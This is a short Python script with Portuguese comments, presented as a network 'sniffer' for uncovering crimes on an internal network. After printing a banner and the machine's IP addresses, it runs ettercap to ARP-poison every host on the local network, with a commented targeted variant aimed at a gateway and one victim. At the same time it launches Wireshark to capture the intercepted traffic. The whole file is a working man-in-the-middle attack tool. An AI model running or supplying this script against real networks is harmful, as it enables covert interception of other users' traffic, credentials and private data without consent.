"""
Programa: Sniffer ShellScript + Python3 -> Desvendando possiveis crimes na rede interna
"""

# Bibliotecas
from os import system
from time import sleep
from threading import Thread

# Apresentacao
def apresentacao():

    # Comando de sistema
    system("clear")
    print("\033[01;31m # DARK PROGRAMMER 000 \033[01;37m")

    # IP externo
    system("echo -n ' # IP [externo]: '")
    system("curl ifconfig.me --silent | awk {'print $1'}")

    # IP interno
    system("echo -n ' # IP [interno]: '")
    system("hostname -I | awk {'print $1'}")

    # Simbolo
    print('''\033[01;32m
    		      ..:::::::::..
                  ..:::aad8888888baa:::..
              .::::d:?88888888888?::8b::::.
            .:::d8888:?88888888??a888888b:::.
          .:::d8888888a8888888aa8888888888b:::.
         ::::dP::::::::88888888888::::::::Yb::::
        ::::dP:::::::::Y888888888P:::::::::Yb::::
       ::::d8:::::::::::Y8888888P:::::::::::8b::::
      .::::88::::::::::::Y88888P::::::::::::88::::.
      :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
      :::::::Y88888888888P::|::Y88888888888P:::::::
      ::::::::::::::::888:::|:::888::::::::::::::::
      ::::::::::::::::8888888888888b::::::::::::::'
       :::::::::::::::88888888888888::::::::::::::
        :::::::::::::d88888888888888:::::::::::::
         ::::::::::::88::88::88:::88::::::::::::
           ::::::::::88::88::88:::88::::::::::'
             ::::::::88::88::P::::88::::::::'
               ::::::88::88:::::::88::::::'
         	    ::::::::::::::::::::
                       ::::::::::
                       \033[01;37m''')
    
    # Mensagem
    print("\033[01;31m Investigacao ativada \033[01;37m")
    sleep(2)

# Metodo: Envenenando ARP
def arpSpoofing():

    # ArpPoisoning: Atentar para a placa de rede
    # ArpPoisoning direcionado: gnome-terminal -- ettercap -Tqi $placa -M ARP //$ip_gateway// //$ip_alvo//
    # system("ettercap -Tqi eth0 -M arp //192.168.0.1// //192.168.0.10//")
    
    # ArpPoisoning: Atentar para a placa de rede
    system("ettercap -Tqi eth0 -M arp ///")    

# Metodo: Analisador de trafego da rede
def wireshark():

    # Apresentacao
    system("wireshark")

# Metodo: Principal
def main():

    # Chamada de metodo
    apresentacao()
    
    # Montagem de Threads
    threading_ArpSpoofing = Thread(target=arpSpoofing)
    threading_WireShark = Thread(target=wireshark)

    # Start
    threading_ArpSpoofing.start()
    threading_WireShark.start() 

# Execucao
if __name__ == '__main__':

    try:
        main()

    except Exception as erro:
        print(erro)
